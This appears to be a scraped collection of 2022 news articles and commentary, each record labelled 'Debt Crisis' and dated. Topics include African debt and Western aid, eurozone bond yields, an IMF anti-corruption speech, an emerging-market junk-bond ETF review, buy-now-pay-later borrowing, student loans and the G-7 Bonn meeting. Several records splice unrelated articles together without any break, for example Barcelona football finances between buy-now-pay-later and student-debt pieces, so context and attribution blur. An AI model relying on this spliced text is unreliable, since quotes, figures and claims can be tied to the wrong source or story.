Western politicians often boast about short-term outcomes of foreign aid projects as career achievements, yet with little interest in the long-term ramifications. For example, the World Bank reviews only 5% of its loans after 3 to 10 years, and is yet to make public its surveys of what borrowing governments think of its performance.

The ultimate beneficiaries

Investigations have shown that large sums of capital from the aid agencies of Western countries more often than not flows back into the hands of domestic interest groups. US-based NGOs, such as World Vision and Save the Children, receive 40% of their financing from US aid funds. Their frequent and unsupervised trips to recipient countries usually cost 30% to 45% of their aid project's total budget. Of the $80 million funding of the US Agency for International Development for the UN's malaria project in 2005, the largest part was spent on the agency itself (such as employing advisers), with only 1% and 5% for the purchase of medicine and mosquito nets.

Ultimately, those who control the dollar have much to gain from Africa's debt accumulation. With the financial hegemony, the US can easily transfer domestic economic crises to the rest of the world, in many cases simply through printing more greenbacks. When the US Federal Reserve returns to the playbook of monetary tightening and interest rate raising, Africa and other parts of the developing world will find their dollar-denominated debt obligations increasingly expensive and a debt crisis hardly avoidable.

Africa's entrenched debt vulnerabilities are in essence the legacy of an unjust, predatory global economic and financial order dominated by the US and other wealthy Western countries. As poor countries struggle against the looming debt crisis, one should not lose sight of who caused the trouble in the first place.

Nevertheless, the specter of another debt crisis – such as the one that brought the eurozone to its knees more than a decade ago – is still a long way off, experts say, as the impact on public finances will only be gradual.

How high?

The rise in sovereign bond interest rates has been steep.

For France, the rise in the interest rate, or yield, on its 10-year bonds between January and mid-May was the steepest since 1994, going from near zero percent to 1.5%.

Germany's 10-year bonds experienced a similar increase, as have other eurozone nations.

Greece, which still faces the highest interest rates in the eurozone after a sovereign debt crisis that began over a decade ago, has seen the yield on its 10-year bonds recently surpass 3.5%.

The impact?

Higher borrowing costs mean that governments have to pay more to refinance their debt.

As countries have taken on vast amounts of additional debt to stave off economic collapse from the worldwide coronavirus pandemic, the higher interest rates will inevitably impact public finances.

For France's 10-year bonds, ""each percentage point increase in interest rates translates into nearly 40 billion euros ($43 billion) in additional annual costs, or nearly the current defense budget,"" the head of the central bank, Banque de France, Francois Villeroy de Galhau said recently.

Analysts at investment bank Natixis suggest that for debt to remain sustainable, long-term interest rates must keep below the rate of economic growth in the long term.

How big a worry?

For now, however, the higher rates ""remain absorbable, we're not at levels of 10% or 15%,"" said Virginie Maisonneuve, global chief investment officer for equity at Allianz Global Investors.

""Some gymnastics and adjustments are needed, but its manageable,"" she said.

Moreover, countries do not need to refinance all of their debt, so the impact of higher interest rates on state coffers will only be gradual.

In addition, soaring inflation, paradoxically, has a positive effect, as it boosts the value of economic output and, in turn, tax revenue, but at the same time reduces the proportion of debt to the overall economy.

What is the risk for the eurozone?

While no country is currently facing a situation like the one Greece faced in 2009 – and which triggered a debt crisis across the entire eurozone – the situation could become something of a headache for the European Central Bank.

Investors do not just look at interest rates themselves, but also at the so-called ""spread"" or difference between the borrowing costs of individual countries.

The wider the spread, the greater the challenge for the ECB to use interest rates as a lever in monetary policy.

The spread between Germany – which historically pays the lowest interest rates – and Italy has more than doubled in the past year.

Few analysts expect a significant deterioration in the situation.

However, the ECB has signaled it will act against what it sees as an unjustified fragmentation of the eurozone debt market and is currently drawing up the tools it needs to do so.",Debt Crisis,2022-05-26 07:00:00

As prepared for delivery

A very good morning to all. On behalf of the IMF and its Africa Training Institute, I welcome you to this conference, jointly organized with the African Union Commission.

Let me start by thanking Governor Moses Pelaelo and the Botswanan authorities for hosting this forum and for their generous hospitality.

It’s especially appropriate that we are gathered in Botswana for this conference. Botswana has an excellent story; its trajectory—from one of the world’s poorest economies, to now an upper middle-income country—is a testament to your prudent macroeconomic management, strong governance, and good institutions. I am confident Botswana can leverage this strong foundation by continuing to uphold the highest standards of governance.

The issue of good governance and transparency is more than just about wasted money – it is about the erosion of a social contract and the corrosion of the government’s ability to grow the economy in a way that benefits all citizens.

Of course, corruption has long been an issue. But today, as we face multiple crises at once – the COVID-19 pandemic, the war in Ukraine, and the ongoing challenges of climate change and the security situation in the Sahel – the need for good governance has only become more urgent.

These multiple crises have made it very clear that countries that have strong economic institutions could respond more effectively to these challenges and better prepare for a resilient recovery — and that is true across any level of development. We also recognize that addressing corruption is an international issue, given the role of professions that enable corruption and jurisdictions that provide safe harbor for the proceeds of corruption.

So today, I’d like to talk about three things. First: how we, at the IMF, are stepping up our engagement with the region on governance and anti-corruption issues. Second, some of the success stories we are seeing across Africa. And finally, what are the key elements of good governance and accountability that stand out in these examples – and that the region as a whole must focus on to truly seize Africa’s potential.

Let me begin with the IMF’s increasing emphasis on this issue.

The Fund’s enhanced framework on governance and corruption, approved in 2018, builds on lessons we learned in over 20 years. Our efforts focus on reducing vulnerabilities to corruption by strengthening governance in six core state functions: central bank governance, financial sector governance, fiscal governance, market regulation, rule of law, and anti-money laundering.

In our policy dialogue with member countries, we look at the strength of their anticorruption framework—especially whether it is aligned with the specific issues confronting a country—and work with them on policy options to strengthen governance and anticorruption frameworks. But we go beyond policy advice. At the request of country authorities, we also provide technical assistance and training to policymakers in this area.

Much of this effort is coordinated by the IMF’s network of 17 capacity development centers around the world. In fact, we have six such centers in Africa—including the Africa Training Institute—that work closely with countries and development partners to help develop and implement comprehensive governance reform strategies in areas from fiscal management and central banking and support capacity building programs in anticorruption and rule of law.

The IMF also adapted and stepped up this work in response to the Covid crisis. When the pandemic first hit, the IMF took immediate steps to help member countries save lives and livelihoods. Our message was: “spend what you must, but keep the receipts,” -- prioritize urgent financing while preserving accountability and transparency.

We set out a few parameters:

First, countries receiving IMF emergency financing must commit to transparency and accountability safeguards. This included publishing COVID-19 related procurement contracts—including beneficial ownership of companies, conducting and publishing audits, and detailed reporting on COVID spending.

Second, in cases of severe governance weaknesses, we worked with authorities to ensure remedies would be taken.

And finally, for countries receiving emergency assistance that have, or have sought, multi-year IMF financing arrangements, we continue to closely engage with them on longer-term structural governance and corruption matters. We also engage with non-state actors, which can often provide valuable insights into governance issues.

These efforts are vital for Africa – especially as the continent looks to the future.

We know that the big economic opportunity before us is Africa’s demographic dividend. To earn that dividend, however, we need to meet the aspirations of the new generation. A critical element to doing that is ensuring that public resources are used effectively and contribute to shared and lasting prosperity of the people.

And Africa’s leaders are stepping up to this challenge – with some ranking even higher than many developed economies in the area of governance.

We saw it in Rwanda as it adopted more advanced institutions to rebuild from a devastating conflict.

We saw it in Seychelles as it undertook comprehensive economic and institutional reforms to decisively tackle its 2008 debt crisis.

And here in Botswana, we saw the development of a good policy framework to prudently manage the wealth from mining resources.

Today these countries lead the region in sound governance, but many others are also taking decisive steps.

We have seen good fiscal governance reforms in countries such as Gambia, and Senegal.

Botswana, Zimbabwe, Mauritius, and Ghana have enacted anti-money laundering frameworks.

So, what lessons can the region learn from these examples?

First: the most successful countries in this area have a high level of political commitment to good governance and transparency. You can see that in a number of ways. How their budgets are formulated and presented – they have open access about proposed policy actions. The independence of their central banks from political pressures. Their commitment to declaring the assets of key public officials.

Their resolve to publishing timely audits and following up on findings to hold organizations and individuals accountable.

A second important element we see: respect for the rule of law and property rights. When foreign investors invest in a country, they do so, knowing that the government will respect the contracts, and property rights will be enforced.

A significant priority—and an important third element many of these countries bring—is ensuring efficiency, transparency and public oversight of such investments. In a book that the IMF recently launched on good governance in Sub-Saharan Africa, my colleagues point to studies that tell us that when there is not enough government oversight on the public procurement process, the cost of the projects tends to be higher.

We see a massive need to increase public investment in Africa across infrastructure, health and education -- in a way that is more efficient and transparent.

Fourth, access to information. When we speak to civil society organizations, this is one of the areas they emphasize, so citizens can be informed and can hold their governments accountable for their actions.

And finally, innovation and technology, which we believe can play a big role in helping government deliver on these priorities. In fact, we saw countries rapidly adapt to the pandemic with innovations that helped governments across the continent serve their people more transparently and effectively.

For instance, Sierra Leone launched online applications to improve the government’s ability to track quarantine periods and other services like food delivery.

Togo used technology to identify and validate the needy, and mobile money to deliver direct cash transfers to them. And South Africa used chatbots to reduce the spread of false information on COVID-19.

These are just a few examples that show us why it is essential for policymakers to expand the use of technology to improve the efficiency of government processes – and also enable greater transparency. Integrating new technology into areas like financial management, procurement, or monitoring of natural resource management can revolutionize how government works. It can also transform relations between government, private sector, and civil society – reducing unnecessary interactions, and enabling more dynamic and inclusive forms of oversight and monitoring.

Let me close by saying that improving governance and accountability in Africa is not only possible; but it is actually happening – as you heard from my many examples. Of course, we have miles to go in our efforts. And it is a long process that requires strong political will and consistent efforts over time.

As each of our member countries move in that direction, I want to reinforce that the IMF is firmly committed to being a trusted partner in your efforts. This conference is a stepping stone in the effort toward what is perhaps one of the most critical issues of our times.

I would love to hear your thoughts during the conference. Thank you.",Debt Crisis,2022-06-13 10:38:27

Investment Thesis

Bonds have been a terrible investment YTD as their price had to adjust to one of the most aggressive monetary tightening cycles in recent history. Economists were particularly worried about emerging markets (""EM"") since there is a clear historical correlation between financial crises in EM and the Fed's hawkish monetary policy. While inflation expectations have come down in recent weeks in the US, I personally believe an elevated level of inflation is here to stay for some time. Moreover, a slowdown in economic activity could add further downside risk over the next couple of months. In this context, EM high yield (""HY"") bonds are risky to own for the moment, regardless of how high their yield is.

Strategy Details

The VanEck Vectors Emerging Markets High Yield Bond ETF (NYSEARCA:HYEM) tracks the performance of the ICE BofA Diversified High Yield US Emerging Markets Corporate Plus Index. The fund invests in USD-denominated emerging markets bonds that are rated below investment grade.

If you want to learn more about this strategy, please click here.

Portfolio Characteristics

Over 86% of funds are invested in emerging market corporate bonds, followed by government bonds which have an ~11% allocation. Corporate bonds are generally seen as riskier than government bonds since governments can always print more money in order to service their debt.

Morningstar

~55% of issuers are rated BB, which is a credit rating just below investment grade. This is a speculative rating, and it is generally assigned to companies facing financial uncertainties and/or who are vulnerable to adverse economic conditions. ~43% of assets are rated B and below. These securities carry high default risk. Finally, less than 3% is assigned to BBB-rated bonds, which is in line with the strategy's goal of investing primarily in corporate junk bonds.

Morningstar

According to Morningstar, the portfolio's average maturity is ~9 years. Over 45% of constituents have a maturity of more than 5 years, which doesn't surprise me since the portfolio is trying to maximize the yield.

VanEck ETFs

The fund is currently invested in 748 different bonds. The top ten holdings account for ~7% of the portfolio, with no single issuer weighing more than 2%. All in all, HYEM is very well-diversified across issuers.

Morningstar

Based on data from Morningstar, the fund has an effective duration of ~3.8, meaning that for each 1% increase in interest rates, the portfolio's NAV is expected to decrease by 3.8%.

HYEM offers a 6% TTM dividend yield, which is one of the reasons why this fund is popular among income investors. This is much higher than what you could get on a standard emerging market ETF such as the iShares J.P. Morgan USD Emerging Markets Bond ETF (EMB).

Refinitiv Eikon

Risks Abound for Emerging Markets

Despite the relatively high dividend yield, investors should be aware of the risks of investing in HYEM in the current market environment. The probability of an EM debt crisis continues to be high. As rates throughout the world are rising, capital is flowing away from vulnerable countries into developed economies. The Fed plays a particularly powerful role on this topic, and investors have seen numerous times how rising US rates are destabilizing emerging market economies.

Federal Reserve

The Fed has recently embarked on one of the most aggressive monetary tightening cycles in recent history and this had a direct impact on Treasury yields. The 10-year US Treasury yield more than doubled YoY to reach ~3.1% in early May 2022, becoming more attractive for foreign investors in the process.

Refinitiv Eikon

We are now below the 10y yield high as inflation expectations are coming down in the US. The market is betting that we have seen peak inflation in April 2022, as reflected by the 5y/5y breakeven rate and the U.S. 10y TIPS breakeven rate. While this should be interpreted as a bullish indicator for high-yield EM bonds, I personally believe inflation isn't something that goes away so easily and we have countless examples in the past showing that inflation is sticky once it becomes entrenched.

Fidelity

If we take the example of energy, we are now facing a real supply shock as inventories and spare production capacity are at historical lows, while demand continues to be strong going into the summer. Natural gas recently reached its 2008 high and crude oil fluctuates within a $105 to 110/bbl range for some time now. As long as demand is strong, energy will add further inflationary pressures.

Refinitiv Eikon

Energy isn't the only sector where inflation hasn't peaked. Global food prices are on the rise since the COVID-19 lows in March 2020. The war in Ukraine only exacerbated this problem, but the trend already started well before that. As a result, I think inflation shouldn't be removed from the equation so fast unless demand quickly plummets. If inflation is persistent at this level, it could have an important impact on where the Fed sees its neutral rate and that could lead to further selling in the bond market.

FRED/IMF

Speaking of weakening demand, this scenario could very well materialize if we enter into a global recession. A global recession could have far-reaching consequences for EM given the fact that capital will move to safe-haven assets, leading to a dramatic sell-off in EM junk bonds. I believe this scenario is more plausible than a few months ago as illustrated by the recent increase in high yield EM option-adjusted spreads. However, we are still far from 2016 and 2020's highs, suggesting we haven't seen real stress yet, let alone a bottom.

FRED/ICE

Key Takeaways

I believe concerns surrounding a potential EM debt crisis are real and should be seriously considered by investors before purchasing HYEM. Despite the attractive yield, there are several risks such as unexpected higher inflation or a global recession that could impair the long-term performance of HY EM bonds. The option-adjusted spreads indicate the market is starting to price in some of the risks, but we are still far from the 2020 peak, suggesting a bottom in HY EM bonds prices might not be in yet.",Debt Crisis,2022-05-26 07:00:00

New research from the consumer charity found that 51 per cent of 18-34 year olds borrowed money to pay off their BNPL debt. This compares with 39 per cent of 35-54 year olds and 24 per cent of over-55s.

26 per cent of these consumers used credit cards to pay their BNPL bills, with others opting to use their overdrafts, loans and payday loans, as well as borrowing from family and friends.

Citizens Advice warned that using credit to repay debts could lead to a spiralling debt crisis, with young people particularly at risk.

This view was echoed by personal finance experts, who said that BNPL regulation “can’t come soon enough.”

“Taking out a loan to pay off buy now pay later purchases could lead to a perpetual cycle of debt that is difficult to escape from,” said Myron Jobson, senior personal finance analyst at interactive investor.

“It also completely mitigates the main draw of BNPL arrangements in that they allow consumers to delay or split the cost of purchase without paying interest. Interest applied to loans means the debt would swell the longer it takes to pay off.”

Jobson warned that BNPL schemes can be a “banana skin” for those embroiled in debt, as many BNPL providers don’t conduct thorough credit checks to ensure that borrowers can afford to make repayments. This is set to become a more dangerous issue as the cost of living crisis escalates.

Earlier this year, Hargreaves Lansdown research found that six per cent of Brits have already used BNPL solutions like Klarna to pay for groceries, and another 12 per cent would consider doing this in the future.

“The escalating cost of living crisis risks people turning to BNPL schemes to help tide them over,” added Jobson.

“You can now buy essential groceries through some BNPL services which is particularly disconcerting. It is never a good idea to borrow to pay for essentials – it is a shortcut to unmanageable debt.

“Regulation of the BNPL industry can’t come soon enough.”

Former peer-to-peer lenders Funding Circle and Zopa have recently entered the BNPL space, using advanced credit-checking technology to ensure that they only lend to creditworthy borrowers, in line with upcoming regulation.

Barcelona president Joan Laporta has praised the club's board for rescuing the Spanish giants from their ""terminal"" financial situation.

Laporta, who returned as Barca president in March 2021, said they are ""still working"" to reduce the club's debt and balance their books, but added that the club are in a much better position compared to when he arrived.

""When we arrived over a year ago, the club was in a terminal [financial] situation,"" Laporta told reporters. ""We have restructured our debt, we have saved on financial costs, we have controlled our expenditure and we have increased our revenue.""

Laporta said in August that his board had inherited a debt of €1.35 billion, meaning Barca were unable to register a new contract for legend Lionel Messi, who joined Paris Saint-Germain as a free agent last summer.

Barca financial vice-president Eduard Romeu said that the wage bill was €560 million, almost double that of Bayern Munich and €160m more than LaLiga rivals Real Madrid.

The Catalan club will hold an assembly on June 16 looking to get authorisation on several financial moves to boost Barca's economy.

""If these financial operations are approved by our members, it will be good news for us,"" Laporta said. ""We will balance our books sooner than we expected.""

Laporta said he was hopeful of extending the contract of young midfielder Gavi, whose deal due to expire in next summer.

""We are optimistic,"" Laporta said. ""We obviously want Gavi to continue at Barca.""

Gavi, 17, made 34 league appearances for Barca this past season and became Spain's youngest goalscorer after netting against the Czech Republic in a 2-2 draw in the Nations League last weekend.

Warren is now a big advocate for canceling student loan debt, a Band-Aid solution that doesn’t fix the root problem. Giving $10,000 or $50,000 to the Harvard and Massachusetts Institute of Technology graduates who, like Warren, live in Cambridge, Massachusetts, doesn't make college more affordable. It's a wealth transfer from the working class to the professional class.

Yet, if we look at what Warren was saying about the cost of higher education in 2004, she offered pragmatic solutions to keep the cost of public colleges from spiraling further out of control. Warren didn’t suggest larger government subsidies for these institutions at the taxpayers’ expense. In her book The Two-Income Trap: Why Middle-Class Mothers and Fathers Are Going Broke, Warren and her daughter, Amelia Warren Tyagi, advocated public colleges cutting bloat and not raising prices on students.

Warren and her daughter wanted tuition freezes that would gradually lower the cost of a degree to something more affordable. And they weren’t attached to raising taxes or legalizing any new vices, such as gambling or marijuana, to cover the cost. Warren and Tyagi warned against more tax revenue funding the proposed multiyear tuition freeze because it would incentivize more fiscally irresponsible behavior. And they argued that leaders of higher education facilities can always find a way to justify spending increases — even when they’re unnecessary.

""Their leaders are true believers in the research and scholarly missions of their schools, and their desire for excellence — however it is measured among universities — is genuine,” Warren and Tyagi wrote. “It is no wonder that they can always justify their rising costs and why they need every penny that comes their way — and more.""

“There can always be more research, more athletic fields, more books for the library,"" they continued. ""To be sure, the issues are complex, and a spending freeze might force some universities to make some very tough choices. In the long run, however, it would refocus public universities on their mission — providing an education for all qualified members of the public, not just those who can come up with ten or twenty thousand dollars per year.”

This is the framework in which the discussion of affordable higher education should exist.

Both parties should come together to combat bloat in higher education to make the system more affordable for the average person. With bloated athletic budgets, unnecessary administrative staff, and other inefficiencies in spending costing students billions per year, problems exist that need addressing.

Pragmatic solutions exist. Cutting nonrevenue sports or at least moving down divisions offers ways to save money on athletics, as do reasonable administrative staffing ratios set statewide. And state schools can offer three-year bachelor's degrees, as many European colleges do; the key there is to cut classes that have nothing to do with the degree.

The primary focus of Warren’s book was liberalizing bankruptcy law. Making it impossible to discharge private student loan debt via bankruptcy made the student debt problem worse, so reversing course could help. Also, states should stop revoking work licenses when people default on student loan debt. Taking away people’s ability to work makes it harder for them to pay their debt. Warren deserves credit because she has sponsored legislation with Sen. Marco Rubio (R-FL) outlawing the practice.

Warren is aware of many of the problems contributing to the rising cost of higher education. It would be great if she used her seat in the U.S. Senate and massive platform to try doing something practical about it. Repeating platitudes that rile up progressives while accomplishing nothing only makes this problem worse.

The student loan debt crisis has crippled nearly 43.4 million borrowers across the country. According to the Education Data Initiative, the average public university student borrows $30,030 to obtain a bachelor’s degree. Meanwhile, those who attend private universities borrow $43,900 on average.

Over the last two years, American students have been given a reprieve from paying off their exorbitant debt thanks to the pandemic-induced student loan moratorium that was enacted in March of 2020. However, that could come to an end on Aug. 31 if no federal action is taken, leaving Americans with student loan debt struggling to make ends meet as inflation continues to soar amid looming fears of a potential recession.

Data shows that Black and Latino student loan borrowers will be hit hardest if the Biden Administration fails to pass legislation that would provide immediate debt relief for individuals drowning in student loans.

Before the moratorium was implemented, some borrowers of color saw their loan balances continue to climb despite years of making monthly payments faithfully. New data published by the Center for Responsible Lending notes that “nearly 75% of Black borrowers and 63% of Latino borrowers have seen their student loan balances grow rather than shrink, compared to 51% of white borrowers.”

Black and Latino borrowers graduate owing more than white students

Four years after graduation, 48% of Black students owe an average of 12.5% more than they borrowed, and 29% face monthly student loan payments of $350 or more, making it hard to save for a home or future investments.

Consumer financial services company Bankrate notes that Latino borrowers often owe nearly $38,000 post-graduation. Black college students can graduate owing an average of $52,726 compared to white college graduates, who owe closer to $28,006 on average, according to the Brookings Institution.

Democratic lawmakers like Sens. Chuck Schumer and Elizabeth Warren have been urging the president to wipe out nearly $50,000 worth of debt for Black and Latino borrowers, who make up nearly 22% and 28% of student loan debt, respectively. Canceling that amount provides more than 70% of relief for both groups.

On May 27, a coalition of 529 organizations wrote a letter to Joe Biden and Vice President Kamala Harris demanding the administration authorize student loan forgiveness through executive order.

“Black borrowers report that their student loan debt often feels like a life sentence, even if they use relief programs like Income-Driven Repayment because they watch the amount owed balloon over time,” the letter read. “Student debt cancellation has the potential to increase the net wealth of Black households and could even help reduce the racial wealth gap. We call on you to deliver on the promise of the Biden-Harris Racial Economic Equity plan by canceling federal student debt by executive action immediately.”

In an Asian Development Blog, ADB Economic Research and Regional Cooperation Department Principal Economist Benno Ferrarini and Independent Consultant to Governments and International Institutions Marcelo Giugale said that currently, the debt levels in Asian countries remain sustainable.

However, sustainable debt levels do not mean they are risk-free. Ferrarini and Giugale said the fiscal space of many countries in the region may shrink further due to the post-pandemic reconstruction and this poses risks.

“Asian countries should implement the reforms necessary while their debt is sustainable to head off a debt crisis in the future or to facilitate a resolution should the crisis hit,” Ferrarini and Giugale said.

“While there are few universal prescriptions for a group of countries this diverse, full transparency about debt and its management, and increased mobilization of domestic resources should be a prerogative to all,” they added.

Apart from transparency, the ADB exports said reforms should include tapping new instruments as well as preparing for fiscal risks that could come from natural, operational, financial, commodity, and others.

Preparing for these fiscal risks means Asian governments could buy insurance against those risks directly from investors or through multilateral development banks.

Countries, Ferrarini and Giugale said, could leverage the market for impact finance such as thematic bonds such as green, blue, social, and gender, among others.

“Not all of these instruments currently fit every country, because financial standing and institutional capacities differ. But the menu is ample and flexible,” they added.

On Monday, this newspaper reported that the Bureau of the Treasury raised P10 billion out of its P15-billion offering as the auction committee decided to reject bids for 364-day Treasury bills (T-bills) as investors demanded “unacceptable rates.”

Had the Treasury fully awarded bids for the 364-day T-bills, the rates would have averaged 2.716 percent, higher by 67.6 basis points from the comparable secondary market benchmark rate for the tenor at 2.04 percent.

As of end-March, the national government’s outstanding debt has hit a new record-high of P12.68 trillion as it resorted to more borrowings after revenue collections remained weak while government spending grew.

The national government’s debt-to-GDP ratio has also risen to a 17-year-high at 63.5 percent, above the internationally recommended 60-percent threshold by multilateral lenders for emerging markets like the Philippines. It is also the highest since the country’s debt-to-GDP ratio hit 65.7 percent in 2005 under the Arroyo administration.",Debt Crisis,2022-05-31 07:00:00

BONN, Germany — The financial leaders of the world’s most powerful countries warned this week of the potential for a global economic slowdown, as the threats caused by Russia’s invasion of Ukraine continued to multiply. Wp Get the full experience. Choose your plan ArrowRight Globally, the war is sending energy and food prices soaring. In the United States, Britain and Europe, central banks determined to curb inflation are moving to hike interest rates, which risks pushing nations into recession. The developing world faces an emerging debt crisis on top of a growing hunger problem sparked by the war.

In the United States, as in much of the rest of the world, gasoline prices surged and stock markets plunged, with the S&P 500 index nearing a bear market, closing the week down 18 percent off its early January peak after a late Friday rally. Large retailers, including Target and Walmart, have reported worse than expected earnings and profits this week, blaming higher costs and excess inventory that piled up in response to supply chain problems.

“If I had to sum it up: more uncertainty, more inflation, less growth,” François Villeroy de Galhau, the governor of the Bank of France, said of the impact of the war, at a conference here of finance minsters and central bankers from the powerful Group of Seven industrial nations.

After approving trillions of dollars in fiscal stimulus to avert the downturn caused by the coronavirus pandemic, world economic leaders are now grappling with the threat of “stagflation” — slow, or negative, economic growth, coupled with rising inflation.

The risks abroad may be even greater than in the United States, economists say. In Europe, the euro zone only grew by 0.2 percent in the first quarter of 2022, suggesting a potential slowdown. Some economies within Europe even shrank: Italy’s, for example, contracted slightly in the first quarter of this year.

The war poses a more serious economic threat to Europe than to the United States, particularly given the continent’s dependence on Russian energy, said Jason Furman, a former Obama administration economist. China’s efforts to contain the coronavirus also continue to rattle the global economy, with the latest data from Beijing showing a major decline in retail spending and a drop in gasoline output.

Russia’s economy is doing even worse since the war began, though: The White House says it expects Russia’s gross domestic product to shrink by as much as 15 percent this year due to the sanctions imposed after the invasion, despite Moscow’s profits from rising energy prices.

The World Bank has also warned of a “huge buildup of debt,” particularly in the poorest countries, with debt payments at their highest level in 20 years. Half of low-income countries are now categorized as being at “high risk” of debt distress, according to the Center for Global Development, a Washington-based think tank. Defaults by poorer nations could have ripple effects throughout global financial markets if creditors worldwide go unpaid.

“This is a very difficult economic situation,” Treasury Secretary Janet L. Yellen said after the conference Wednesday night. Yellen said economic shocks from the war, additional sanctions on Russia and further inflationary pressure were all possible. But she, like many European officials, still held out some hope that policymakers would be able to handle the difficult circumstances.

The global economy, particularly the United States, was projected to grow relatively quickly in 2022 before the war, creating a buffer that may help avert recession. “I think it’s conceivable there could be a soft landing,” Yellen said, referring to the potential of the Federal Reserve to cool inflation without causing a recession.

The G-7 conference yielded limited action to head off these emerging threats to the global economy. In closed-door discussions Thursday and Friday, world leaders resolved to take largely unspecified action on debt management in developing countries, global economic stability and taming inflation. Their most tangible action was to pledge roughly $20 billion in economic assistance to Ukraine.

The G-7 leaders also resolved in a joint statement to take action related to Sri Lanka’s debt crisis and alleviate food shortages. They pledged as well to keep international markets open, as some countries move to impose export controls to prevent scarce supplies of food and other goods from leaving their countries. World economic leaders in Bonn emphasized that they understood the extent of the dangers, but also acknowledged they may not be prepared to resolve them.

A senior official with the French delegation, who spoke on the condition of anonymity to describe the private meetings, said that “the implementation is too slow” and that world leaders must move faster to solve developing nations’ debt challenges.

“The situation of low-income states poses risks to global security and stability of the international financial system,” Christian Lindner, Germany’s finance minister, told reporters. “We will have to deal with the situation.”

Linder later added: “This is a risk for international financial stability, and it gets even worse if these countries get into financial difficulties [surrounding] food security in their countries.”

That hunger crisis is already painful, and it could get worse as the war drags on. More than 14 million people in Somalia, Ethiopia and Kenya — half of them children — are “on the verge of starvation,” according to the International Rescue Committee. That number is projected to rise to 20 million by mid-2022 without substantial global action.

During the G-7 meetings, American and French officials were most vocal on the need to address the hunger crisis, according to three people familiar with the meeting, who spoke on the condition of anonymity to describe the closed-door discussions.

“It’s significantly, significantly worse than it was even at the beginning of the covid recession, even though they’re not talking like it is,” said Max Lawson, head of inequality policy at Oxfam International, a humanitarian aid group. “The impact we are seeing already in the developing world is hideous and painful, and it’s happening right now.”

The pressing challenges pushed some of the Western leaders’ other aspirations to the background. Yellen, for instance, has prioritized a reordering of the international tax order to ensure that large corporations pay a global minimum tax. With that revamp stalled amid objections from Poland, it did not dominate discussions at the G-7. Similarly, aggressive action on climate change — long sought by the G-7 countries — also drew less attention at this conference. Many of these issues are expected to be discussed further when G-7 leaders meet later this year.

Eswar Prasad, a Cornell University economics professor who worked at the International Monetary Fund , said national financial leaders are increasingly alarmed by the global economic conditions, citing conversations he has had with international finance ministers and central bank officials. Of particular concern is that policymakers’ main tool to address economic shocks — additional stimulus to increase demand — is largely off the table because of high inflation and high levels of debt.

“The global economy is at a critical juncture, beset by a variety of adverse shocks,” Prasad said. “The degree of anxiety has ratcheted up enormously because increasing confidence of declining growth, adverse supply shocks and rising inflation — all of which substantially reduce the room for policy maneuvers.”

correction An earlier version of this story incorrectly stated that economics professor Eswar Prasad had formerly worked at the Federal Reserve. He worked at the International Monetary Fund.

Driving the day

$5 IS HERE: Gasoline hit $5 per gallon on a national basis for the first time ever on Saturday, according to the American Automobile Association, keeping the pressure on the Biden administration. The White House has been considering meeting with Saudi leadership, a diplomatic move that could draw more oil into the market and cool off the rally in energy prices that have been a major inflation driver.

President Joe Biden, for his part, told reporters Saturday that he hasn’t yet made a decision on whether to pay the Saudis a visit this summer. As much as gas prices are hurting Democrats, Biden is also facing pressure to shun Saudi Arabia for its human rights record and the killing of Washington Post journalist Jamal Khashoggi. Speaking with reporters at the end of the Summit of the Americas on Saturday, Biden said any meeting in Saudi Arabia would dive into areas beyond oil and focus on security issues.

But even if he can secure additional barrels beyond the modestly higher increase the Saudis pushed under the recent OPEC decision, tight refinery capacity is likely to prevent any significant new supply from reaching motorists. White House Council of Economic Advisers Chair Cecilia Elena Rouse told CNN Friday the president was looking into ways to ramp up refinery capacity, and considering ""what he can do administratively, whether that's working with oil companies and refineries asking them, 'We recognize your back capacity challenges — what can we do to help you maintain your refining capacity and bring more oil online?'""

Still, Americans aren’t letting high prices keep them off the road, POLITICO's Ben Lefebvre reports. David Goldwyn, head of energy consulting agency Goldwyn Global Strategies, told Ben he didn't expect drivers to start seriously curbing their driving until gas hits the $6 or $7 per gallon mark. Drivers are largely opting to cut back on retail purchases instead. Many of the factors impacting high prices, from the war in Ukraine to the loss of global refinery capacity to the summer driving season, are temporary and volatile, making it difficult to predict long-term price moves — and making it less appealing for consumers to make drastic decisions to cut down on long-term costs like switching to electric vehicles.

On the Hill

BILLS TO CONSIDER: The House Natural Resources Committee has a lot of legislative action on its plate this week. The National Parks, Forests and Public Lands subcommittee holds a legislative hearing Tuesday on eight public lands bills, with Lena McDowall, deputy director of Management and Administration for the National Park Service, testifying.

The full committee has a mark up on Wednesday on 11 bills on issues ranging from the legacy of Indian boarding schools to lighting up the Gateway Arch in the colors of the Ukrainian flag.

The Water, Oceans and Wildlife subcommittee will have a legislative hearing on Thursday to discuss a number of water works and environmental bills, including Rep. Melanie Stansbury’s water data collection bill, which would centralize state, local and federal water data. The bill is a key component to New Mexico Democrats’ “aquabus” package on water security. Stansbury will testify at Thursday’s hearing.

One of the bills in Thursday’s hearing, the Delaware River Basin Conservation Reauthorization Act of 2022, will also go under the microscope in front the of the Senate Environment and Public Works Committee on Wednesday, when the committee has a legislative hearing on four coastal conservation bills.

WATER IN ENERGY: The Senate Energy Committee will also be going into water security issues this week with a hearing Tuesday on how to address the drought in the western U.S. The committee’s Water and Power subpanel had a legislative hearing on a spate of water security bills last month, including Stansbury’s water data bill.

The committee will also vote Tuesday on three nominations: David Applegate to be director of the U.S. Geological Survey, Carmen Cantor to be assistant secretary of the Interior for Insular and International Affairs and Evelyn Wang to lead DOE’s ARPA-E.

METHANE MADNESS: The House Climate Crisis Committee convenes Tuesday to discuss state efforts to cut down methane emissions. New Mexico Gov. Michelle Lujan Grisham and Wyoming Gov. Mark Gordon will both testify. The House Science Committee had a similar hearing last week that focused on ways the federal government could help monitor methane emissions.

EYE TO EUROPE: The House Foreign Affairs Europe, Energy, the Environment and Cyber Subommittee meets Thursday to discuss ways the U.S. can support European energy security. Last week’s explosion at the Freeport LNG terminal in Texas could pose a wrinkle in the Biden administration’s plans to secure 15 billion cubic meters of liquefied natural gas to Europe, POLITICO’s Ben Lefebvre reported. Thursday’s hearing will include testimony from Andrew Light, assistant secretary of Energy for International Affairs, Harry Kamian, principal deputy assistant secretary of State in the Bureau of Energy Resources, and Jake Levine, chief climate officer at the U.S. International Development Finance Corporation.



Around the Agencies

